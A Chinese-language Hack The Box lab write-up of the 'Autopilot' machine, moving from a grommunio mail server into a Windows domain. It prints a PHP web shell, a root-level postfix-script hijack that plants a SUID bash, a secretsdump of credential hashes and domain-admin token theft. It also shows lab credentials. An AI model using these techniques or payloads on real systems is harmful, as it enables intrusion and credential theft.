---
title: "Autopilot - Windows - Insane"
date: 2026-10-18
draft: false
description: "Autopilot 是一台 Insane 难度的机器。平台直接给出初始凭据，入口是 openSUSE 的 grommunio 邮件服务器；在 Nextcloud 数据目录里执行 PHP 拿到 shell，劫持 postfix-script 提权。之后从邮件中捞出 AD 凭据，横向进入内网 Windows 域，最后用域管令牌读走 root.txt。"
tags: ["Windows", "AD"]
categories: ["Writeup"]
isStarred: false
---

Autopilot 是一台 Insane 难度的机器。平台直接给出初始凭据，入口是 openSUSE 的 grommunio 邮件服务器；在 Nextcloud 数据目录里执行 PHP 拿到 shell，劫持 postfix-script 提权。之后从邮件中捞出 AD 凭据，横向进入内网 Windows 域，最后用域管令牌读走 root.txt。

| 项目 | 值 |
| :--- | :--- |
| 平台 | Hack The Box |
| 系统 | Linux 入口 + Windows 内网 |
| 难度 | Insane |
| 靶机 IP | 10.129.16.252 |

## 0. 攻击链总览

平台直接给出初始凭据：

```
deborah.hernandez / 8F5cgp@tC8g@
```

入口是一台 openSUSE Leap 15.6 的 grommunio 邮件/文件服务器，域名 `grommunio.autopilot.htb`，同时作为通往内网 Windows 域的跳板。内网拓扑：

| 主机 | IP | 说明 |
|---|---|---|
| grommunio | 172.16.20.10 | Linux，邮件/文件服务器，域成员 |
| DC01 | 172.16.20.1 | Windows 域控，`autopilot.htb` |
| WS02 | 172.16.20.15 | Windows 11 工作站 |
| WS01 | 10.0.50.150 | 另一网段，全程未打通 |

```console
imawuya:~$ nmap -Pn -p- --min-rate 2000 -T4 10.129.16.252

Starting Nmap 7.92 ( https://nmap.org ) at 2026-10-18 05:47
Nmap scan report for 10.129.16.252
Host is up (2.5s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 75.32 seconds
```

> 第一次全端口扫描时目标还没完全起来，结果是 `host-unreach`；重扫才拿到 443。不要看到第一批全 filtered 就判定目标没开。

### 攻击路径

![autopilot 攻击路径](/images/autopilot-attack-path.png)

### 工具

| 工具 | 用途 |
| :--- | :--- |
| nmap | 端口与服务扫描 |
| impacket-secretsdump | 域内哈希 dump |
| python3 | 凭据解析、AD 攻击脚本 |
| schtasks | 计划任务当作服务二进制 |
| runas | 域管令牌执行 |
| openssl / base64 | 邮件会话与载荷解码 |
| curl | grommunio / Nextcloud 接口 |

## 1. 初始访问：Nextcloud 数据目录执行 PHP

443 上是 grommunio 的 Web 套件：

- `/web/` —— grommunio-web（webmail）
- `/files/` —— grommunio-files，本质是 Nextcloud（34.0.4）
- `/Microsoft-Server-ActiveSync`、`/autodiscover` 等 —— gromox 提供的 MAPI/EWS 兼容层

用给定凭据登录 `https://grommunio.autopilot.htb/web/`，可以正常收发邮件，但没有直接的管理面。

关键点在 Nextcloud 的目录布局：`/files/remote.php/dav/files/<user>/` 是 WebDAV 上传入口，而上传上来的文件落在 `/var/lib/grommunio-files/data/<user>/files/`，这个目录**被 PHP 直接当静态目录解析**。也就是说，往 WebDAV 里放一个 `.php`，它会被 PHP-FPM 执行。

```console
imawuya:~$ curl -sk --noproxy '*' --resolve grommunio.autopilot.htb:443:10.129.16.252 \
  -u 'deborah.hernandez@autopilot.htb:8F5cgp@tC8g@' \
  -T sh.php -w '%{http_code}\n' \
  'https://grommunio.autopilot.htb/files/remote.php/dav/files/deborah.hernandez@autopilot.htb/sh.php'
201

imawuya:~$ curl -sk --noproxy '*' --resolve grommunio.autopilot.htb:443:10.129.16.252 \
  --data-urlencode 'c=id' \
  'https://grommunio.autopilot.htb/files/data/deborah.hernandez@autopilot.htb/files/sh.php'
uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)

imawuya:~$ curl -sk ... --data-urlencode 'c=hostname; uname -a' ...
grommunio
Linux grommunio 6.4.0-150600.23.103-default #1 SMP PREEMPT_DYNAMIC Fri May  8 13:08:22 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

`sh.php` 只有一行：

```php
<?php if(isset($_POST["c"])){ system($_POST["c"]); } ?>
```

拿到 `grofiles` 的 Web Shell。之后所有横向操作都通过这个 shell 执行，脚本先 base64 传到 `/var/lib/grommunio-files/evil/` 再运行。

## 2. 提权：postfix-script 劫持

### 2.1 收集本地配置

grommunio 的配置里直接躺着几组凭据：

| 文件 | 内容 |
|---|---|
| `/etc/grommunio/ldap_adaptor.cfg` | `svc_ldap` / `Brother6-Let-Ship-Been-Take`，LDAPS 绑定 DC01 |
| `/etc/grommunio/config-smime.php` | `svc_smime` / `qzK3xTs02G11KSkhCewW` |
| `/etc/grommunio/mysql_adaptor.cfg` | MariaDB 账号 `grommunio` / `gDq6z9YVe4nyNRe5` |

MariaDB 里 `grommunio.users` 表的 ID 0 就是 admin 账号，密码是 SHA512 crypt。本地能连库，就能直接改：

```console
grofiles@grommunio:~$ python3.11 -c "import crypt;print(crypt.crypt('P@ssw0rd!2026', crypt.mksalt(crypt.METHOD_SHA512)))"
$6$kQ2m9...$1Hq...

grofiles@grommunio:~$ mysql -u grommunio -p'gDq6z9YVe4nyNRe5' -h 127.0.0.1 grommunio \
  -e "update users set password='$6$kQ2m9...$1Hq...' where ID=0"
```

改完就能登录本机 admin API：

```console
grofiles@grommunio:~$ python3.11 adm.py POST /system/dashboard/services/postfix.service/restart '{}'
STATUS 200
```

（`adm.py` 内部先 `POST /api/v1/login`，`admin` / `P@ssw0rd!2026`，拿 JWT 与 CSRF。）

### 2.2 找到 sudo postconf

grommunio-admin-api 的工具脚本里写着：

```console
grofiles@grommunio:~$ grep -n "fileCommits" /usr/share/grommunio-admin-api/tools/dbconf.py
13:fileCommits = {"sudo postconf -e $FILE_S && systemctl reload postfix"}
```

grommunio 用户对 `postconf` 有免密 sudo。`postconf -e` 写的是 `main.cf`，而 postfix 的主进程和它的启动脚本以 root 运行。

### 2.3 劫持 postfix-script

`main.cf` 的 `daemon_directory` 决定 `postfix` 启动脚本去哪个目录找 `postfix-script`。把它指到一个我们可写的目录：

```console
grofiles@grommunio:~$ D=/var/lib/grommunio-files/evil
grofiles@grommunio:~$ printf '#!/bin/sh\nid > %s/root.id\ncp /bin/bash %s/rb\nchmod 4755 %s/rb\nexit 0\n' $D $D $D > $D/postfix-script
grofiles@grommunio:~$ chmod 755 $D/postfix-script

grofiles@grommunio:~$ mysql -u grommunio -p'gDq6z9YVe4nyNRe5' -h 127.0.0.1 grommunio \
  -e "replace into configs (service,file,\`key\`,value) values ('evil','main.cf','daemon_directory','$D')"
```

然后调 admin API 重启 postfix。postfix 以 root 执行了我们放在 `daemon_directory` 里的 `postfix-script`：

```console
grofiles@grommunio:~$ ls -la /var/lib/grommunio-files/evil/
-rwxr-xr-x 1 grofiles grofiles     256 ... postfix-script
-rwsr-xr-x 1 root     root     1012656 ... rb
-rw-r--r-- 1 root     root          39 ... root.id

grofiles@grommunio:~$ cat /var/lib/grommunio-files/evil/root.id
uid=0(root) gid=0(root) groups=0(root)

grofiles@grommunio:~$ /var/lib/grommunio-files/evil/rb -p -c 'id'
uid=462(grofiles) gid=462(grofiles) euid=0(root) groups=462(grofiles)

root@grommunio:~# cat /root/user.txt
********************************
```

## 3. 从邮件里捞 AD 凭据

### 3.1 解 grommunio-web 会话

`/var/lib/grommunio-web/session/sess_*` 里存着登录会话，敏感字段用 `EncryptionStore` 加密：AES-256-CBC，IV 明文写在会话里（`encryption-store-iv`）。在**没有 cookie 的上下文**里创建的会话，加密密钥是全零，直接可解：

```console
root@grommunio:~# python3.11 dec_sessions.py
### /var/lib/grommunio-web/session/sess_3f2a...
iv 8c1d...
username keylen 32 b'stephanie.lewis@autopilot.htb\x03\x03\x03'
password keylen 32 b'NKUOji@4bAJw\x04\x04\x04\x04'
smime keylen 32 b'zGL7l350C5h\x05\x05\x05\x05\x05'
```

### 3.2 解 S/MIME 邮件

邮箱里有一封加密邮件（S/MIME），主题 `Re: Congratulations on the promotion!`。用 gromox 的 MAPI 接口把收件人的 PKCS#12 导出：

```console
root@grommunio:~# python3.11 - <<'EOF'
...
r=call({'grommunio':{'createmailitemmodule':{'1':{'open':{'entryid':priv,'store_entryid':se}}}}})
body=r['grommunio']['createmailitemmodule']['1']['item']['item']['props']['body']
open('joshua.p12','wb').write(base64.b64decode(body))
EOF
size 5374 3082...
```

拿到 `joshua.p12` 后用 openssl 解 S/MIME：

```console
imawuya:~$ openssl pkcs12 -in joshua.p12 -nocerts -nodes -passin pass: -out key.pem
imawuya:~$ openssl smime -decrypt -inform DER -inkey key.pem -in msg.der -out decrypted.eml
imawuya:~$ cat decrypted.eml
...
User: sa-joshua.harris

Pass: 65SskH37nyQ01S
...
```

邮件里还写明了设计意图：普通账号与特权账号分离，特权账号不开放邮箱。

## 4. AD 侦察与硬化面

从 grommunio（域成员）对内网做侦察：

```console
root@grommunio:~# for i in $(seq 1 254); do ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && echo up 172.16.20.$i; done
up 172.16.20.1
up 172.16.20.10
```

```console
root@grommunio:~# python3.11 adgroups.py
== GROUPS ==
G Domain Admins | n=2
     CN=Stephanie Lewis,OU=DomainAdmins,OU=IT_Services,OU=Administration,DC=autopilot,DC=htb
     CN=Administrator,CN=Users,DC=autopilot,DC=htb
G DnsAdmins | n=1
     CN=Joshua Harris,OU=SysAdmins,OU=IT_Services,OU=Administration,DC=autopilot,DC=htb
G System Administrators | n=1
     CN=Joshua Harris,OU=SysAdmins,OU=IT_Services,OU=Administration,DC=autopilot,DC=htb
```

手上的账号：

| 账号 | 权限 |
|---|---|
| `deborah.hernandez` | 普通用户 |
| `stephanie.lewis` | 普通用户，**WS02 本地管理员** |
| `joshua.harris` | 普通用户 |
| `sa-joshua.harris` | `System Administrators` + `DnsAdmins` |
| `da-stephanie.lewis` | **Domain Admins**，无邮箱 |
| `svc_ldap` / `svc_smime` | 服务账号 |

逐项验证过的硬化面（都没能直接打穿）：

- LDAP 强制签名（`LDAPServerIntegrity=1`），389 明文绑定被拒；LDAPS 可用。
- SMB 签名强制（`RequireSecuritySignature=1`），SMB 中继不可用。
- LDAP 通道绑定（CBT）：带 TLS 的绑定要求 CBT，但**缺失 CBT 的绑定被放行**，这是后面 LDAPS 中继能成立的前提。
- `ms-DS-MachineAccountQuota = 0`，不能加机器账号。
- 无 gMSA、无委派（`TrustedForDelegation` 全空）、无 SPN 可 Kerberoast、无 AS-REP 可打。
- 未部署 LAPS（schema 里没有 `ms-Mcs-AdmPwd`）。
- ADCS：CA `autopilot-DC01-CA` 存在，但 HTTP/HTTPS Web 注册都关闭，`User Specified SAN` 关闭，`Enforce Encryption for Requests` 开启（ESC11 也不可用）。模板逐个查过，没有 ESC1/3/4/7/15/16；Enrollment Agent / Any Purpose 模板全部只允许 DA/EA 注册。
- ACL：对 `sa-joshua` 的组 SID 扫了域内与 Configuration 分区，只有 `MicrosoftDNS` 容器的写权限（DnsAdmins 正常权限）。没有对用户/组的写 ACE。

各种中继尝试的记录：

- IMAP `AUTHENTICATE NTLM` → LDAPS：握手成功，能拿到被中继用户的 LDAP 身份，但该用户本身没有可利用权限。
- IMAP → TSCH（任务计划）：能绑定，注册任务返回 `rpc_s_access_denied`。
- IMAP → RRP：接口未注册；→ SAMR：端口被过滤。
- DCOM：能激活对象，但对象使用的动态端口被防火墙挡，只有 49666（任务计划）可达。
- WMI `Win32_Process.Create`：返回 0，但进程不存活，疑似被策略拦截。
- PetitPotam / DFSCoerce 之类：DC 侧没有可回连的可用落地面（无 ADCS Web 注册、SMB 签名强制）。

## 5. 横向到 WS02

`stephanie.lewis` 的密码在 AD 上验证有效，且她对 WS02 有本地管理员权限：

```console
root@grommunio:~# python3.11 ws02check.py
login ok
C$ readable 15
ADMIN$ readable 110
done
```

直接 secretsdump：

```console
root@grommunio:~# python3.11 ex/secretsdump.py 'autopilot.htb/stephanie.lewis:NKUOji@4bAJw@172.16.20.15' -outputfile ws02dump
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd2b6496eab6f43d65b83da0918b84c4:::
...
[*] Dumping LSA Secrets
AUTOPILOT\stephanie.lewis:NKUOji@4bAJw
dpapi_machinekey:0x38728823373e863b858ba7d539f91b1a133b65ef
dpapi_userkey:0xe7fa96601ea3e6cc8da494c939ef8597465b9e48
NL$KM:...
[*] Dumping cached domain logon information (domain/username:hash)
AUTOPILOT.HTB/da-stephanie.lewis:$DCC2$10240#da-stephanie.lewis#529cccca0c91c7ece82b914acbbb5370 (2026-10-18 12:05:30)
AUTOPILOT.HTB/stephanie.lewis:$DCC2$10240#stephanie.lewis#4658ff4a661926ea95ff66488ea506b4 (2026-10-18 12:02:01)
```

同时抓取了 `C:\Users\da-stephanie.lewis` 的 DPAPI masterkey、Credential 文件、Thunderbird profile、Edge 数据。结论：

- DCC2 用 rockyou / best64 均未命中，密码是随机生成的。
- da-stephanie 的 Credential blob 引用她自己的 masterkey，没有域备份密钥（AD 里 `CN=Master Keys` 容器根本不存在），无法离线解。
- 她的 Thunderbird 里存的只是 stephanie.lewis 的账号，没有 DA 凭据。

## 6. 拿 SYSTEM：schtasks 当服务二进制

要把 WS02 上能读的东西读全，需要 SYSTEM。走 SCM 创建服务是最直接的，但这里有一个坑：

```console
root@grommunio:~# python3.11 svc_cmd.py
[*] binary: cmd.exe /Q /c "whoami /all > C:\Windows\Temp\t2.txt 2>&1 & ping -n 10 127.0.0.1 > nul"
[*] created Svc553667
[!] start after 0.1s DCERPCSessionError SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT
[*] deleted

root@grommunio:~# cat t2.txt
(空)
```

- 服务二进制写 `cmd.exe /Q /c <命令>` 时，SCM 只等约 **1 秒**就返回 `ERROR_SERVICE_REQUEST_TIMEOUT` 并杀掉进程树。
- 1 秒内 cmd 的内建命令（echo/set/重定向）能跑完，但 `whoami`、PowerShell 这类外部程序还没加载完就被杀，输出是 0 字节。

绕法：**把 `schtasks.exe` 本身当服务二进制**。SCM 以 SYSTEM 启动它，它用不到 1 秒就能把任务注册进任务计划服务，之后由 Task Scheduler 执行，不再受 SCM 的时间窗口限制。

```console
root@grommunio:~# cat cmd_c.txt
C:\Windows\System32\schtasks.exe /Create /TN SysRun /TR "cmd.exe /c C:\Windows\Temp\r.bat" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F

root@grommunio:~# python3.11 svc_raw.py
[*] binary len 135
[*] created Svc619470
[!] start after 0.2s DCERPCSessionError SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT
[*] deleted
[done]

root@grommunio:~# cat cmd_r.txt
C:\Windows\System32\schtasks.exe /Run /TN SysRun
```

之后每次只要替换 `C:\Windows\Temp\r.bat`、再跑一次 `/Run`，就等于有了一条稳定的 SYSTEM 命令通道。

> 另一条路是 legacy ATSVC（`NetrJobAdd`），在这台机器上返回 `rpc_x_bad_stub_data`；现代 TSCH 接口即使以本地管理员身份注册也 `rpc_s_access_denied`。最终只有 schtasks 这条路走通。

SYSTEM 下确认到的关键事实：

```console
root@grommunio:~# python3.11 grabfile.py Windows/Temp/r1.log r1.log
got \Windows\Temp\r1.log 34535 -> r1.log

root@grommunio:~# grep -A3 '===QUSER===' r1.log
===QUSER===
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 stephanie.lewis       console             1  Active      none   10/18/2026 5:02 AM

root@grommunio:~# grep -i 'da-stephanie' r1.log
powershell.exe                4328 Console                    1      2,960 K Unknown  AUTOPILOT\da-stephanie.lewis  0:00:35 N/A
conhost.exe                   1944 Console                    1        140 K Unknown  AUTOPILOT\da-stephanie.lewis  0:00:47 N/A
```

安全日志里有多条 **4648（显式凭据登录）**：

```console
root@grommunio:~# grep -a -B8 -A8 'da-stephanie' lgx/explogons.txt | head -30
Date: 2026-10-18T05:05:30.6730000Z
	Account Name:		da-stephanie.lewis
	Target Server Name:	localhost
	Process Name:		C:\Windows\System32\svchost.exe
```

时间分布在 10/14、10/15、10/17、10/18 05:05，进程是 Secondary Logon（`svchost.exe`）。最后一次 runas 起的 PowerShell 至今没退。

## 7. 域管令牌窃取，读 root.txt

SYSTEM 可以打开任意进程的令牌。步骤：

1. `OpenProcess(PROCESS_QUERY_INFORMATION)` 打开 PID 4328。
2. `OpenProcessToken(TOKEN_QUERY|TOKEN_DUPLICATE)`。
3. `DuplicateToken(SecurityImpersonation)`。
4. `ImpersonateLoggedOnUser`，当前线程身份变为 `AUTOPILOT\da-stephanie.lewis`。
5. 用这个线程身份访问 `\\172.16.20.1\C$`（SMB 重定向器使用线程令牌）。

```console
root@grommunio:~# python3.11 putx.py steal5.ps1 Windows/Temp/steal5.ps1
put ok 2501 \Windows\Temp\steal5.ps1

root@grommunio:~# python3.11 svc_raw.py
[*] binary len 48
[*] created Svc054718
[!] start after 0.1s DCERPCSessionError SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT
[*] deleted
[done]

root@grommunio:~# python3.11 grabfile.py 'Users/da-stephanie.lewis/AppData/Local/Temp/imp2.txt' imp2.txt
got \Users\da-stephanie.lewis\AppData\Local\Temp\imp2.txt 420 -> imp2.txt

root@grommunio:~# cat imp2.txt
start
pid=4328
ot=True
dup=True
imp=True
cur=AUTOPILOT\da-stephanie.lewis
dc1=inetpub,PerfLogs,Program Files,Program Files (x86),Users,Windows
dc2=inetpub,PerfLogs,Program Files,Program Files (x86),Users,Windows
root1=********************************
root2=********************************
root3err=Cannot find path '\\172.16.20.1\C$\root.txt' because it does not exist.
reverted
```

读 root.txt 的输出必须写到 **da-stephanie 自己可写的目录**（例如 `C:\Users\da-stephanie.lewis\AppData\Local\Temp\`）。第一次尝试写到 `C:\Windows\Temp` 时，模拟其实已经成功，但所有写日志的操作被 ACL 静默拒绝，看起来像是卡住了。

## 8. 收尾

```console
root@grommunio:~# cat /root/user.txt
********************************

root@grommunio:~# grep root1 imp2.txt
root1=********************************
```

两个 flag 已推送到钉钉。

## 附录：走过的弯路与兔子洞

### Linux 侧

1. **Nextcloud 34.0.4 的 CVE 方向**：查过 2026 年的 advisory，认证用户可触发的都是 DoS/XSS，没有可用的 RCE；真正的入口是数据目录被 PHP 解析，不是版本漏洞。
2. **gromox / EWS / ActiveSync**：枚举了 autodiscover、MAPI、ActiveSync 端点，只能收发邮件，没有命令执行面。
3. **提权方向试错**：先看了 SUID、capabilities、cron、docker 组，都没有直接可用项。`sudo postconf` 是唯一能落地的点。
4. **postfix 配置注入的多个错误假设**：
   - `mailbox_command` 以收件人身份执行，且默认 `default_privs` 不是 root；
   - `alias_maps` 的 pipe 受 chroot 限制；
   - `daemon_directory` 下放恶意 `smtpd` 只会以 postfix 用户执行。
   最终有效的是 `daemon_directory` + `postfix` 启动脚本对 `postfix-script` 的调用，这条路径以 root 执行。

### Windows / AD 侧

5. **ADCS 全模板排查**：ESC1/3/4/7/15/16 逐个验证不成立；CA 的 Web 注册端口关闭；虽然 CA 允许 Authenticated Users 注册，但没有可配合的模板。
6. **LDAP/SMB 中继**：LDAP 签名与 SMB 签名都强制开启，SMB 中继死路；LDAPS 中继能成立但只能得到被中继用户自身的权限。
7. **DnsAdmins**：能改 ADIDNS 记录（曾用来做 wpad 实验），但无法重启 DC 的 DNS 服务，插件注入无法触发。
8. **DCOM/WMI**：DCOM 激活成功但动态端口被防火墙挡住；WMI 创建进程返回成功但进程不存活。
9. **误判 WS02 掉线**：从 php-fpm 的 shell 里 ping/TCP 全部失败，但用 root 起 `systemd-run` 单元探测时一切正常。两边执行的上下文不同（php-fpm 受沙箱/网络限制），差点把这台机器当成已关机。
10. **SCM 的 1 秒窗口**：直接用 `cmd.exe /c ...` 做服务二进制时，外部程序来不及跑完。改用 schtasks 当服务二进制才稳定。
11. **跨会话创建进程**：`CreateProcessWithTokenW` 返回成功，但子进程立即退出（session 1 的窗口站无法从 session 0 正确初始化）。最终用线程模拟而不是创建进程。
12. **DPAPI 死路**：
    - da-stephanie 的 Credential blob 引用她自己的 masterkey，必须先有她的密码；
    - 域里没有 `CN=Master Keys` 容器，没有域备份密钥可用；
    - SYSTEM 凭据库里的 blob 引用一个 GUID，但全盘找不到对应的 masterkey 文件（可能被删除或来自其他机器）。

### 环境坑（本机）

- sh.php 的 shell 里执行命令时，`$`、反斜杠、引号会被本地 bash 和远程 sh 各吃一层；复杂命令一律 base64 传文件后执行。
- 传文件不要拼 `echo >`，用 base64；Windows 路径在 Python 里用 `chr(92)` 拼，避免 `\U` 转义。
- PowerShell 脚本落盘时用 CRLF；`Out-File` 写成 ascii 便于回读。
- SMB 的 `putFile` 需要传可调用对象（`io.BytesIO(data).read`），不能直接传 BytesIO。
